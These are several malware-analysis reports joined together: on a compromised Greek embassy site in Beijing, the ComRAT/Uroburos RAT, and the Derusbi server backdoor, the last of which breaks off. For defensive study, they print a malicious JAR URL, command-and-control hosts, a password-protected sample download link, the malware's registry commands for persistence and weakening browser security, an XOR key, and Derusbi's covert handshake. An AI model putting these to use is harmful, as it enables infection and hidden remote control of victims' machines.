These types of attacks are far from overt , as a typical target and victim opted to go on their own to what they believe should be a safe and trusted website .
In the case of this post , it appears that at least two different attackers were involved in compromising and placing malicious code on Pro-Democratic websites in Hong Kong .
This is not the first time and surely will not be the last time that those in favor of democracy in Hong Kong will be targeted .
Unfortunately with the level of access and infrastructure the attackers appear to have , this is quite an uphill battle .
Continuing to expose these attack is one means that shines light on these attack operations with an aim at putting a dent in their success .
# 9 Blitzanalysis : Embassy of Greece Beijing Compromise .
It 's friday afternoon , I had a bit of free time and stumbled across this tweet by PhysicalDrive0 ( thx ! ) two hours ago and thought to give it a try to finally add a new article to this Blog ( first of 2014 ) :
https : //twitter.com/PhysicalDrive0/status/479921770838102017 .
So , I went to Google to search for the domain of the Embassy of Greece Beijing and added the ( allegedly ) malicious java file package that was found by PhysicalDrive0 :
URL : http://www.grpressbeijing.com/1.jar ( malicious ! ) .
Next , I loaded the 1.jar file into Java Decompiler to get the source code .
It showed , that the functionality is obfuscated in some way , e.g .
the function csfn ( String paramString ) decrypts all strings by `` removing '' the numbers of the string parameter :
csfn ( `` 64s33333e3333t333S55e666c777u5r333i534t76y2M34a55n76a88g666e44r2222 '' ) > setSecurityManager .
There are some other obfuscation techniques , but they are not important here .
Instead , the following deobfuscated code line in the function init ( ) gives us an idea where the actual payload is located :
Resp localResp = new Resp ( csfn ( `` 234p34a55445c43654k632434234235 '' ) ) ; > pack .
We can also see , that the java package contains a file named pack , so we open 7-Zip and unpack the file .
A quick view with a PE viewer showed , that it is a x86 PE executable not even encrypted ( SHA256 : b832e4b5a4829c8df6de7b42c5cb32ef25b5ab59072b4c2a7838404cd0dd5e5f ) :
Figure 2 : Payload inside Java package .
Figure 3 : Payload inside PE viewer .
So , I opened IDA Pro to take a quick look at the functionality .
Together with the strings of the executable , we get a brief idea of what the purpose of this malware is .
The important strings are as follows :
SELECT * FROM AntiVirusProduct reg add `` HKCU\Software\Microsoft\Windows\CurrentVersion\InternetSettings `` /v PrivDiscUiShown /t REG_DWORD /d 1 /f reg add `` HKCU\Software\Microsoft\InternetExplorer\Main `` /v DEPOff /t REG_DWORD /d 1 /f reg add `` HKCU\Software\Microsoft\InternetExplorer\Main `` /v DisableFirstRunCustomize /t REG_DWORD /d 2 /f reg add `` HKCU\Software\Microsoft\InternetExplorer\Main `` /v Check_Associations /t REG_SZ /d no /f reg add `` HKCU\Software\Microsoft\InternetExplorer\Main `` reg add `` HKCU\Software\Microsoft\InternetExplorer\PhishingFilter `` /v ShownVerifyBalloon /t REG_DWORD /d 3 /f reg add `` HKCU\Software\Microsoft\InternetExplorer\PhishingFilter `` /v Enabled /t REG_DWORD /d 1 /f reg add `` HKCU\Software\Microsoft\InternetExplorer\PhishingFilter `` reg add `` HKCU\Software\Microsoft\Windows\CurrentVersion\InternetSettings `` /v WarnOnPostRedirect /t REG_DWORD /d 0 /f reg add `` HKCU\Software\Microsoft\Windows\CurrentVersion\InternetSettings `` /v WarnonZoneCrossing /t REG_DWORD /d 0 /f reg add `` HKCU\Software\Microsoft\InternetConnectionWizard `` /v AutoRecover /t REG_DWORD /d 2 /f reg add `` HKCU\Software\Microsoft\InternetConnectionWizard `` /v Completed /t REG_BINARY /d 1 /f \cmd.exe .
Together with the output of IDA Pro , we can see that this malware uses the command line tool cmd.exe for adding several registry keys to Internet Explorer .
It also tries to retrieve possible AntiVirus information by using the COM interface ( dc12a687-737f-11cf-884d-00aa004b2e24 > IWbemLocator > SELECT * FROM AntiVirusProduct ) .
Furthermore , it makes use of the COM to launch an instance of Internet Explorer ( d30c1661-cdaf-11d0-8a3e-00c04fc9e26e > IWebBrowser2 ) , supposedly to contact its C & C server .
To verify this , we open up Wireshark and run the executable .
As a result , we get the following network information :
C & C server : defense.miraclecz.com ( IP : 208.115.124.83 ) HTTP GET request : /index.asp ? id=50100 .
Also , we see that it downloads some kind of data ( Base64 encoded ) .
But first , we combine the C & C server and the HTTP request and open the URL in our favorite Browser :
Figure 4 : Base64 encoded ( 2nd ) Payload .
URL : defense.miraclecz.com/index.asp?id=50100 .
As you can see , there is a string named microsoft followed by Base64 encoded data .
Side note : Is there also a Linux equivalent ? Next , we copy the Base64 encoded data and go to the following website to let us decode it into a file ( because I had the feeling it 's just another unencrypted executable ) :
http : //www.motobit.com/util/base64-decoder-encoder.asp .
As a result , we get another executable ( SHA256 : a4863f44f48d1c4c050dd7baad767a86b348dd4d33924acf4e0a3cd40c6ae29f ) that was only Base64 encoded and not encrypted in any way :
Figure 5 : Downloaded Payload .
So again , we fire up our PE viewer and take a look at the important strings :
http://buy.miraclecz.com reg add `` HKCU\Software\Microsoft\InternetExplorer\Main `` /v DEPOff /t REG_DWORD /d 1 /f reg add `` HKCU\Software\Microsoft\InternetExplorer\Main `` /v DisableFirstRunCustomize /t REG_DWORD /d 2 /f reg add `` HKCU\Software\Microsoft\InternetExplorer\Main `` /v Check_Associations /t REG_SZ /d no /f reg add `` HKCU\Software\Microsoft\InternetExplorer\Main `` reg add `` HKCU\Software\Microsoft\InternetExplorer\PhishingFilter `` /v ShownVerifyBalloon /t REG_DWORD /d 3 /f reg add `` HKCU\Software\Microsoft\InternetExplorer\PhishingFilter `` /v Enabled /t REG_DWORD /d 1 /f reg add `` HKCU\Software\Microsoft\InternetExplorer\PhishingFilter `` reg add `` HKCU\Software\Microsoft\Windows\CurrentVersion\InternetSettings `` /v WarnOnPostRedirect /t REG_DWORD /d 0 /f reg add `` HKCU\Software\Microsoft\Windows\CurrentVersion\InternetSettings `` /v WarnonZoneCrossing /t REG_DWORD /d 0 /f reg add `` HKCU\Software\Microsoft\InternetConnectionWizard `` /v AutoRecover /t REG_DWORD /d 2 /f reg add `` HKCU\Software\Microsoft\InternetConnectionWizard `` /v Completed /t REG_BINARY /d 1 /f reg add `` HKCU\Software\Microsoft\Windows\CurrentVersion\Run `` /v spoolsv.exe /t REG_SZ /d % % temp % % \spoolsv.exe /f spoolsv.exe Software\Microsoft\Windows\CurrentVersion\Run open file fail cmd timeout error % d Run cmd error % d cmd.exe /c % s > % s % s % d.txt open file error % temp % % s % s.ini myWObject \cmd.exe ! DOCTYPE html % s/ ? id1=blank % d & id2= % d % d % s/ ? id1= % d % d .
Again , we load the executable into IDA Pro and quickly fly over the assembly code to get an idea of the functionality .
Once again , it creates several registry entries with the help of the command line tool and creates an instance of the Internet Explorer ( CoCreateInstance ( ) > d30c1661-cdaf-11d0-8a3e 00c04fc9e26e ) for contacting the C & C server .
This time , the network information is as follows :
C & C server : buy.miraclecz.com ( IP : 74.121.191.33 ) URL parameters ( from strings of executable ) : % s/ ? id1=blank % d & id2= % d % d % s/ ? id1= % d % d .
From the code we can see , that the sample has also the ability to encode/decode data from/to Base64 .
The dynamic analysis showed the malware sample contacted the C & C server , but was n't sending any URL parameters ( id1 , id2 ) .
Also the server did n't respond .
The files can be downloaded here :
https : //www.dropbox.com/s/ckr7p5kka62cc7s/Embassy % 20of % 20Greece % 20- % 20Beijing.zip Password : `` infected '' ( without `` `` ) .
That 's it , have a nice weekend .
The Uroburos case : new sophisticated RAT identified .
In February 2014 , the experts of the G DATA SecurityLabs published an analysis of Uroburos , the rootkit with Russian roots .
We explained that a link exists between Uroburos and the Agent.BTZ malware , which was responsible for `` the most significant breach of U.S .
military computers ever . `` .
[ 1 ] .
Nine months later , after the buzz around Uroburos , aka Snake or Turla , we now identified a new generation of Agent.BTZ .
We dubbed it ComRAT and , by now , analyzed two versions of the threat ( v3.25 and v3.26 ) .
As reported earlier this year , Agent.BTZ used the same encoding key and the installation log file name as Uroburos .
ComRAT , in its version 3.25 , shows the same behavior .
Furthermore , the attackers also shared a C & C domain .
The latest version of ComRAT known to us ( v3.26 ) uses a new key and does not create the installation log file , in order to complicate the analysis and to disguise the link between the two cases .
Another very interesting fact : the attackers use COM Object hijacking , the same persistence mechanism as COMpfun , which we described recently .
Taken everything into consideration , the indications we saw during our analyzes lead to the supposition that the group behind Agent.BTZ and Uroburos is still active and is pursuing the Agent.BTZ path once more to improve and change the RAT .
Dropper .
The analyzed file is the latest version we identified : v3.26 .
The version identification is described in the chapter “ Log files ” .
The major difference between this version and the older version ( s ) will be described there .
File installation .
The first task of the malware is to install the file credprov.tlb in % APPDATA % \Microsoft\ .
This file is the main payload of the malware .
The dropper executes the following command in order to install a second file :
rundll32.exe % APPDATA % \Microsoft\credprov.tlb , Install % APPDATA % \Microsoft\shdocvw.tlp .
The second file is shdocw.tlp .
The two files are Microsoft Windows dynamic libraries .
Persistence .
To be started during the boot process of the infected machine , the malware creates the following registry key :
HKCU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32=%APPDATA%\shdocvw.tlp .
This registry key is used to associate the library shdocvw.tlp to the object 42aedc87-2188-41fd-b9a3-0c966feabec1 as previously explained in the article about COMpfun .
The purpose is to load the library into each and every process executed on the infected system .
Dropper ’ s log file .
If the version of the malware is older than 3.26 , the dropper creates an additional file called winview.ocx .
We noticed that the file name is still the same as the file name used by Agent.BTZ in the past .
The file is xored with the following obfuscation key ( used by both , Uroburos and Agent.BTZ ) :
1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s .
Here is the decoded log file content :
user1 @ gdata $ ./decode.py winview.ocx Log begin : 06.11.2014 22:55:55 TVer=2.2 06.11.2014 22:55:55 TVer=2.3 06.11.2014 22:55:55 CFG : CFG_4 06.11.2014 22:55:55 User : user1 06.11.2014 22:55:55 Machine : x86 06.11.2014 22:55:55 Removing C : \Documents and Settings\user1\Application Data\\Microsoft\\shdocvw.tlb [ 2 ] 06.11.2014 22:55:55 Removing C : \Documents and Settings\user1\Application Data\\Microsoft\\oleaut32.dll [ 2 ] 06.11.2014 22:55:55 Removing C : \Documents and Settings\user1\Application Data\\Microsoft\\oleaut32.tlb [ 2 ] 06.11.2014 22:55:55 Removing C : \Documents and Settings\user1\Application Data\\Microsoft\\credprov.tlb [ 2 ] 06.11.2014 22:55:55 Removing C : \Documents and Settings\user1\Application Data\\Microsoft\\libadcodec.dll [ 2 ] 06.11.2014 22:55:55 Removing C : \Documents and Settings\user1\Application Data\\Microsoft\\libadcodec.tlb [ 2 ] 06.11.2014 22:55:55 Writing C : \Documents and Settings\user1\Application Data\\Microsoft\\shdocvw.tlb 51200B Ok 06.11.2014 22:55:56 Writing C : \Documents and Settings\user1\Application Data\\Microsoft\\credprov.tlb 260096B Ok 06.11.2014 22:55:57 Exit code1 0 06.11.2014 22:55:57 Writing 3072B Ok .
We can notice that the malware checks if an older version is installed on the system and if this is the case , the dropper removes the older version .
In contrast to this , in our Uroburos analysis , we found out that Uroburos does not install itself in case a version of Agent.BTZ was found on a system .
Execution flow and features .
During the startup of the infected machine , the shdocvw.tlp library is loaded into all processes .
If the process is explorer.exe , this library will load the other library called credprov.tlb .
This library is the real payload .
Its features are common for a Remote Administration Tool ( RAT ) :
command execution ; file download ; file upload ; information gathering .
ComRAT ’ s communication to the command and control server is performed by the browser process and not by explorer.exe in order to avoid being blocked by a firewall on the system or any additional security products .
The communication between the processes is performed by named pipe .
Log files .
Two log files are created during the malware execution : mskfp32.ocx and msvcrtd.tlb .
If the malware version is older than 3.26 , the xored key is the same as the dropper key .
Concerning the version 3.26 , the malware uses a new non-ASCII key .
Here is an example of decoded log file for the version 3.26 :
user1 @ gdata $ ./decode.py mskfp32.ocx < ? xml version= '' 1.0 '' encoding= '' unicode '' ? > .
2.1 .
0 .
< add key= '' Id '' value= '' 168466483094462 '' / > < add key= '' PVer '' value= '' 3.26 '' / > < add key= '' OSVer '' value= '' 512600 Service Pack 30 '' / > < add key= '' Machine '' value= '' x86 '' / > < add key= '' CryptKeyType '' value= '' 3 '' / > < add key= '' CryptKeyId '' value= '' 0 '' / > < add ke= '' IsAdmin '' value= '' 1 '' / > < add key= '' Http idx1 '' value= '' 4294967295 '' / > < add key= '' Http idx2 '' value= '' 4294967295 '' / > < add key= '' Http timeout '' value= '' 60 '' / > < add key= '' Time '' value= '' 06:11:2014 15:54:34 '' / > < add key= '' Bias '' value= '' -2 '' / > < add key= '' PcName '' value= '' USER1-ABC1234 '' / > < add key= '' UserName '' value= '' user1 '' / > < add key= '' WinDir '' value= '' C : \\WINDOWS '' / > < add key= '' TempDir '' value= '' C : \\DOCUME~1\\user1\\LOCALE~1\\Temp\\ '' / > < add key= '' WorkDir '' value= '' C : \\ Documents and Settings\user1\Application Data\\Microsoft\\ '' / > ' .
We can identify the version of the malware thanks to the PVer flag .
The command and control server information is stored in the registry , not in an XML , and encoded :
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\SessionMRU\IPlace .
For example , in the analyzed sample the CC is : weather-online.hopto.org .
This domain is far from unknown , as it has been mentioned in BAE System ’ s Uroburos ( aka Snake ) analysis paper as C & C server domain for the Uroburos malware .
Another connection between the cases .
If the malware version in lower than 3.26 , the XML log file contains the command and control server information :
[ … ] < add ke= '' IsAdmin '' value= '' 1 '' / > < add key= '' Http address '' value= '' webonline.mefound.com `` / > < add key= '' Http address '' value= '' sportacademy.my03.com `` / > < add key= '' Http address2 '' value= '' easport-news.publicvm.com `` / > < add key= '' Http address2 '' value= '' new-book.linkpc.net `` / > < add key= '' Http idx1 '' value= '' 4294967295 '' / > [ … ] .
Summary .
Let us summarize the similarities and differences between Agent.BTZ , Uroburos and ComRAT as far as we can :
Similarities : Before version 3.26 : use of the same xor key use of the same file name for the log On all versions :
Some parts of the code are exactly the same ( appears to be copy & paste ) .
That is the reason why the sample is detected as Uroburos ( aka Turla ) .
The same code was used by Agent.BTZ and also the dll loaded into userland during the Uroburos analysis .
Command and control server domains are shared between Uroburos and ComRAT .
Differences :
In version 3.26 , the author changed the key and remove the known file name .
This action can be an indication for the developer ’ s effort to hide this connection .
The main difference is the design .
Agent.BTZ is a common RAT , a simple library executed on an infected machine .
ComRAT is more complex and cleverer .
The malware is loaded into each and every process of the infected machine and the main part ( payload ) of the malware is only executed in explorer.exe .
Furthermore , the C & C communication blends into the usual browser traffic and the malware communicates to the browser by named pipe .
It is by far a more complex userland design than Agent.BTZ .
These differences , mainly the more complex design , lead us to give this malware a new name .
The analyzed dropper of v3.25 has a compilation date of February 6th 2014 .
The more recent dropper of v3.26 , which has all the mentioned changes implemented , reveals a compilation date of January 3rd 2013 .
We suspect that this date is spoofed in order to disguise that this is in fact a newer version .
Conclusion .
This analysis shows that even after the Uroburos publication in February 2014 , the group behind this piece of malware seems to be still active .
In any case , the ComRAT developers implemented new mechanisms , changed keys , removed log files to hide their activities and tried to disguise the connections between the RAT ComRAT , the rootkit Uroburos and the RAT Agent.BTZ as much as possible .
However , we can still follow the evolution of the malware by comparing the versions .
The persistence mechanism discovered in October 2014 makes it possible to intrude into a system in a really discreet manner and we estimate that other actors will use the same persistence mechanism in the near future .
We will definitely keep our ears and eyes open and continue analyzing .
IOC .
MD5 51e7e58a1e654b6e586fe36e10c67a73 ( dropper v3.25 ) e6ce1f962a47479a86ff2e67129f4ecc ( lib1 , v3.25 ) ec7e3cfaeaac0401316d66e964be684e ( lib2 , v3.25 ) 0ae421691579ff6b27f65f49e79e88f6 ( dropper v3.26 ) 255118ac14a9e66124f7110acd16f2cd ( lib1 v3.26 ) b407b6e5b4046da226d6e189a67f62ca ( lib2 , v3.26 ) 8ebf7f768d7214f99905c99b6f8242dc ( dropper , unknown version ) 9d481769de63789d571805009cbf709a ( dropper , unknown version ) 83a48760e92bf30961b4a943d3095b0a ( lib 64-Bit , unknown version ) ea23d67e41d1f0a7f7e7a8b59e7cb60f ( lib 64-Bit ; unknown version ) Paths % APPDATA % \\Microsoft\\shdocvw.tlb % APPDATA % \\Microsoft\\oleaut32.dll % APPDATA % \\Microsoft\\oleaut32.tlb % APPDATA % \\Microsoft\\credprov.tlb % APPDATA % \\Microsoft\\libadcodec.dll % APPDATA % \\Microsoft\\libadcodec.tlb Registry HKCU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32 Command and control weather-online.hopto.org webonline.mefound.com sportacademy.my03.com easport-news.publicvm.com new-book.linkpc.net .
Related articles : October 30th 2014 : COM Object hijacking : the discreet way of persistence June 2nd 2014 : Analysis of Uroburos , using WinDbg May 13th 2014 : Uroburos rootkit : Belgian Foreign Ministry stricken March 3rd 2014 : Uroburos Deeper travel into kernel protection mitigation February 28th 2014 : Uroburos highly complex espionage software with Russian roots .
[ 1 ] www.foreignaffairs.com/articles/66552/william-j-lynn-iii/defending-a-new-domain .
Derusbi ( Server Variant ) Analysis .
Overview .
There are two types of Derusbi malware : a client-server model and a server-client model .
Both types provide basic RAT functionality with the distinction between the two being largely the directionality of the communication .
This report will focus on the server-client variant ( or simply , the “ server variant ” ) of Derusbi , which acts as a server on a victim ’ s machine and waits for commands from a controlling client .
In and of itself , the Derusbi server variant is a largely unremarkable RAT when viewed from the perspective of functional capabilities .
The server variant supports basic RAT functionality such as file management ( uploading and downloading ) , network tunneling and remote command shell .
What makes the server variant interesting is the device driver that the variant installs .
The server variant utilizes a device driver in order to hook into the Windows firewall by either using largely undocumented Windows Firewall hooking techniques found in Windows XP and older or by using the documented Windows Filtering Platform found in Windows Vista and later .
The driver , after hooking the firewall using either of the two mentioned interfaces , will inspect incoming network packets .
If a specific handshake occurs between the client and the server variant , the remainder of the communication session for the established session will be redirected to the server variant .
If the driver does not detect the appropriate handshake , then the network traffic is allowed to pass unobstructed .
This allows an attacker to hide their communication within a cluster of network sessions originating from a single IP such as would be the case for a client performing multiple HTTP requests against a web server .
Startup Sequence .
The server variant runs as a svchost dependent service .
While the server variant binary does have exports related to the standard service DLL ( e.g .
ServiceMain , DllRegisterService , etc . ) , the startup sequence truly begins in the DllEntryPoint function .
When loaded into memory via a LoadLibrary or equivalent function call , the server variant will determine the name of the host binary ( presumably svchost.exe ) as well as its own DLL ’ s name .
The binary then spawns a new thread that contains the main server variant code in order to allow the DllEntryPoint routine to return to the calling function .
Within the main server variant function ( dubbed mainThread ) , the server variant loads a pointer to the API function GetCommandLineW , locates the pointer in memory to the command line string , and then locates the first space within the command line string and terminates the string by placing a NULL character at the location .
The server variant then attempts to determine if it has suitable access rights within the system in order to operation .
The check for access rights effectively checks to see if the server variant process is running under the NT Authority .
If the check is unsuccessful , then the server variant terminates .
With the command line patched and authority verified , the server variant sleeps for 5 seconds before verifying that the fShutdown flag is not set .
The fShutdown flag can become set by the process loading the server variant calling the DllRegisterServer export .
The DllRegisterServer function , among other tasks , will attempt to install the server variant as a server on the victim ’ s machine .
Therefore , by waiting 5 seconds before continuing the mainThread functionality , the server variant is giving the DllRegisterServer time to activate and perform the necessary operations to ensure that the server variant is properly installed and activated as a service .
The mainThread calls the mainLoop function of the server variant .
The mainLoop function begins by loading the unique infection ID for the victim ’ s machine from the registry ( under the key value located at HKLM\SOFTWARE\Microsoft\Rpc\Security ) .
The infection ID , if present , must be decoded by XOR ’ ing each byte of the string with a static byte value ( typically 0x5F ) .
If the infection ID does not exist within the registry , the server variant will attempt to load the configuration from an encoded buffer located immediately after the static string XXXXXXXXXXXXXXX , decode the buffer by starting at the last byte and XORing each previous byte by the current byte value in reverse order ; the server variant will then use a specific portion of the configuration blob as the infection ID ’ s base .
Next , the server variant will append a hyphen and a four digit value to the end of the infection ID to generate the unique infection ID for the victim ’ s machine .
The newly generated infection ID is then saved to the registry location stated previously .
The mainLoop attempts to get the privileges for SeDebugPrivilege , SeLoadDriverPrivilege , SeShutdownPrivilege , and SeTcbPrivilege in order to perform the necessary operations to load the driver portion of the server variant .
The mainLoop will attempt to open a handle to the driver ( if it is already installed ) by calling CreateFile with the filename of \Device\ { 93144EB0-8E3E-4591-B307-8EEBFE7DB28F } .
Failing this , the mainLoop determines if the victim ’ s machine is running the 360 antivirus product by looking for a process with the name ZhuDongFangYu.exe .
If the process is running , the driver is not installed but the mainLoop continues regardless .
If the process is not found , however , the mainLoop will extract the driver binary from an encoded buffer within itself , decode the file in memory ( using a rotating 4-byte XOR key ) , and install the driver on the victim ’ s machine as % SYSDIR % \Drivers\ { 93144EB0-8E3E-4591-B307-8EEBFE7DB28F } .sys .
With the driver present ( or recently installed ) , the mainLoop spawns another thread ( dubbed DerusbiThread : :DerusbiThread ) that acts as the primary communication loop .
DerusbiThread : :DerusbiThread begins by generating a PCC_SOCK object .
PCC_SOCK is an abstraction for the communication subsystem .
The prototype for PCC_SOCK appears in Figure 1 .
> class BD_SOCK { // members ~BD_SOCK ( ) ; // destructor BD_SOCK * Copy ( bool fCopySocket ) ; // duplicate object // member variables DWORD dwLastError ; char szHostName [ 256 ] ; DWORD dwListeningPortNumber ; SOCKET sktRemoteEndpoint ; SOCKET hListeningSocket ; } ; class PCC_SOCK : BD_SOCK { ~PCC_SOCK ( ) ; // destructor // virtual members PCC_SOCK * Copy ( bool fCopyListeningSocket ) ; SOCKET ConnectToRemoteEndpointByNameAndAttemptChannelByPOSTOrHandshake ( int a2 , int a3 , int a4 , int a5 , char * pszHostname , int wHostPort ) ; SOCKET ConnectToRemoteEndpointByNameAndHandshake ( char * pszHostname , int wHostPort ) ; SOCKET ConnectToRemoteEndpointByNameAndPerformPOSTLogin ( char * pszHostname , int wHostPort ) ; SOCKET WaitForClient ( ) ; int SendEncodedData ( int dwPktType , void * payload , size_t dwPayloadSize ) ; int RecvEncodeData ( DWORD * pdwPktType , char * * pvPayload , DWORD * pdwPayloadSize ) ; void freeMemory ( void * pMemory ) ; // member functions int SendVictimInfo ( ) ; int WaitForReadEvent ( int dwTimeout ) ; int SOCKSConnectWithRandomLocalPort ( int dwEndPointIP , u_short hostshort ) ; int BindToRandomPort ( SOCKET s ) ; int SendBuffer ( SOCKET s , char * buf , int len ) ; SOCKET AcceptIncomingConnection ( ) ; SOCKET ConnectToRemoteEndpointByName ( char * szHostName , int hostshort ) ; SOCKET ConnectToRemoteEndpoint ( int dwIP , u_short wPort ) ; int ReadFromRemoteEndpoint ( char * buf , int len ) ; SOCKET NewSocket ( ) ; int BindSocket ( SOCKET s , int dwLowPort , int dwHighPort ) ; int SendAuthenicationResponse ( void * pvResponse ) ; int SendHTTP200ResponseIfViaHeaderFound ( char * Str ) ; // member variables char compressionBuffer [ 65536 ] ; } ;
Figure 1 : PCC_SOCK Declaration in Pseudo-C++ .
With a new PCC_SOCK object allocates , DerusbiThread : :DerusbiThread selects a port between 40,000 and 45,000 to use as a listening port .
The port number is sent to the driver ( via IOCTL 0x220200 ) in order to inform the driver where to redirect incoming traffic .
The “ Windows Device Driver ( Firewall Hook ) ” section explains the functionality of the driver in greater detail .
DerusbiThread : :DerusbiThread binds to the specified port and opens the port as a listener .
At this point DerusbiThread : :DerusbiThread enters an infinite loop of waiting for new connections to the listening socket and dispatching a new thread ( dubbed CommLoop ) to handle the traffic for the socket until fShutdown is set .
At this point , the startup sequence for Derusbi is complete and the server variant moves into a communication and command dispatch phase .
Windows Device Driver ( Firewall Hook ) .
The communication between the controlling client and the Derusbi server variant depends on the device driver being in place .
The authors of the device driver designed the driver to work on Windows 2000 and later versions of the Windows operating system .
Depending on the version of the victim ’ s OS , the driver will hook the Windows Firewall by either using the surprisingly undocumented IOCTL_IP_SET_FIREWALL_HOOK command of the \\Device\IP device for Windows XP or older machines or by using the documented Windows Filtering Platform ( WFP ) found in Windows Vista and later .
The device driver inspects incoming network traffic from any client connecting to the victim machine , determines if an appropriate handshake packet occurs at the beginning of a new TCP session , and then makes the decision to reroute the network traffic to the Derusbi malware or let the traffic continue unaltered to its original service .
Figure 2 : Device Driver Traffic Redirection .
Once a session has been established by means of a valid handshake , any subsequent packets from the client for the given TCP session will automatically be directed by the device driver to the Derusbi server variant .
The device driver does not capture or store any network traffic outside of the initial handshake inspection .
Communication and Command Dispatch .
The Derusbi server variant will select an available , random port between the range of 40,000 and 45,000 on the victim ’ s machine upon which to listen .
After selecting the port , the server variant will wait for incoming connections and instruct the driver to redirect appropriate TCP sessions to the listening port .
In order to establish a valid communication channel between the server variant and a controlling client , a specific handshake is required .
The handshake between a client and the server variant is well defined and consisting of 64 bytes , the data within the handshake is entirely random with the exception of the 3rd and 8th DWORD .
The handshake begins when the client sends a 64 byte random buffer with the 3rd ( offset 12 ) and 8th ( offset 32 ) DWORDs defined as :
DWORD3 == ~DWORD0 DWORD8 == ROR ( DWORD0 , 7 ) .
The server will acknowledge the handshake by sending a 64 byte random buffer with the same pattern for the 3rd and 8th DWORDs based on the new , randomly generated 1st DWORD ( offset 0 ) .
It is the client ’ s handshake that the driver for the server variant triggers off of .
Some older versions of the server variant use a different set of DWORDs to validate the handshake , also the tests are the same .
These other versions have been observed to use the following DWORDs :
DWORD1 == ~DWORD0 DWORD2 == ROR ( DWORD0 , 7 ) .
If the handshake fails , the server variant provides a secondary means to authenticate a client .
Presumably a failsafe if the driver is unable to load , the secondary method requires the client to send a POST request with the following form :
POST /forum/login.cgi HTTP/1.1\r\n .
In addition , the POST request must contain a Via field .
If the request and the Via field exist , the server variant authenticates the client and responds with .
HTTP/1.0 200 Server : Apache/2.2.3 ( Red Hat ) Accept-Ranges : bytes Content-Type : text/html Proxy-Connection : keep-alive .
If the client ’ s request does not meet the appropriate authentication criteria , the server variant sends :
HTTP/1.0 400 Bad Request Server : Apache/2.2.3 ( Red Hat ) Connection : close .
With a communication channel between the server variant and the client established , the server sends information about the victim ’ s computer .
Consisting of a 180 byte data structure ( Figure 3 ) , the server variant provides the client with a variety of details about the victim ’ s machine .
The VictimInfoPacket has an identifier of 2 ( see the dwPktType explanation below ) .
The communication between the server and the client at this point , and for the remainder of the session , is encrypted .
> # pragma pack ( push , 1 ) struct VictimInfoPacket { int magicValue ; char szInfectionID [ 64 ] ; char szComputerName [ 64 ] ; char szSelfIP [ 16 ] ; char unknownArray [ 16 ] ; int dwOSandSPVersionInfo ; int dwBuildNumber ; char unknownValue ; char OemId ; int16 unused_align2 ; int fCampaignCodeMatch ; } ; # pragma pack ( pop ) .
Figure 3 : VictimInfoPacket Structure Definition .
Communication between the client and the server variant exists in the form of a sequence of encrypted datagrams .
Each datagram consists of a 24 byte header followed by an optional payload section .
The header is not encrypted but if the optional payload is attached , the payload is encrypted using a DWORD XOR .
The format of the header is as follows :
struct PacketHeader { DWORD dwTotalPacketSize ; DWORD dwPktType ; DWORD dwChecksum ; DWORD dwEncryptionKey ; DWORD fCompressedPayload ; DWORD dwDecompressedSize ; } ;
The dwTotalPacketSize field defines the total size of the datagram including both the size of the header and the size of the optional payload .
The dwPktType field correlates to the module ID which allows the server variant to route the datagram to the appropriate module without further inspection of the payload data .
The dwChecksum value is sum of all of the bytes within the optional header ( the field is ignored , but present , if there is no payload section ) .
The dwEncryptionKey is the 32-bit XOR encryption key for the payload section .
If the fCompressedPayload field is non-zero , then the data within the payload is compressed using LZO compression ( prior to XOR encoding ) and the dwDecompressedSize field represents the final size of the payload data after decompression .
The payload section can have up to three different presentations depending on if compression is used .
The first presentation is the original payload data as generated by the client or server , the second presentation is the LZO compressed form , and the final presentation ( the presentation that exists going across the network ) is the 32-bit XOR encoded data blob .
Figure 4 provides a graphical representation of the presentation types of the payload section .
Figure 4 : Possible Presentations of the Payload Section of a Derusbi Server Variant 's Datagram .
After sending the server information via the VictimInfoPacket , the server variant spins off a CommLoop thread for the connection and returns to waiting for new connections from clients to appear .
The CommLoop thread begins by establishing the set of internal command handlers available to the server variant .
With the exception of the administrative command handler ( which is built into the CommLoop ) , each of the internal commands consists of an object derived from a base object PCC_BASEMOD .
class PCC_BASEMOD { ~PCC_BASEMOD ( ) ; // destructor // virtual member functions void * return1 ( ) ; // always returns 1 void Cleanup ( void ) ; void ProcessPacket ( void * pkt , DWORD dwPktSize ) ; int ReadWaitingData ( void * * pPacket , DWORD * dwPktSize ) ; int MallocWithClear ( size_t Size ) ; int Free ( void * Memory ) ; // member variables DWORD dwPacketIdentifierCode ; } ;
Figure 5 : PCC_BASEMOD Pseudo-C++ Declaration .
The server variant appears to have a modular design allowing an attacker to compile only the components that are necessary for any given operation .
The malware supports up to 8 different modules per sample with each module designating its own ID code .
Novetta has observed the following modules :
ID Class Name Module Description 0x81 PCC_CMD Remote command shell 0x82 PCC_PROXY Network tunneling 0x84 PCC_FILE File management 0xF0 n/a Derusbi administrative [ built-in module that does not count against the maximum of 8 modules per variant sample ] .
Given the spacing in ID numbers ( as noted in the gap between 0x82 and 0x84 in an otherwise sequential ID scheme ) , it is conceivable that additional modules exist .
After establishing the tools , an infinite loop ( CommLoop ) is entered in which the server variant will wait for up to 1/100 of a second for input from the network ; if such input arrives , the server routes the packet to the appropriate handler .
If the network input does not arrive , the CommLoop queries each of the command handlers for any packets they may have queued ( by calling each command handler ’ s ReadWaitingData function ) and transmits the packets the handlers have generated .
Additionally , if more than 60 seconds passes between network inputs from the client or network outputs from the server variant , the CommLoop will send out a beacon packet ( dwPktType = 4 ) .
CommLoop routes packets to the appropriate command handler object by locating the dwPacketIdentifierCode within each of the registered command handlers that matches the incoming packets dwPktType .
When the appropriate command handler is found , CommLoop passes the payload of portion of the packet to the command handler ’ s ProcessPacket function .
PCC_CMD .
The PCC_CMD object contains the remote shell functionality of the server variant along with the ability to execute arbitrary programs .
Derived from the PCC_BASEMOD class , the PCC_CMD class ’ s operations are focused largely in the ProcessPacket and ReadWaitingData functions .
The PCC_CMD : :ProcessPacket function works as a stub function that merely passes the packet ’ s payload data ( pkt ) data to PCC_CMD : :ProcessPacketEx while ignoring the dwPktSize parameter .
The packet ’ s payload data is , in and of itself , another datagram with a header and optional payload section .
The payload of each PCC_CMD destined packet contains the following header :
struct PCCCMDPacketHeader { DWORD dwPacketSize ; DWORD field_4 ; // purpose unknown , seemingly unused .
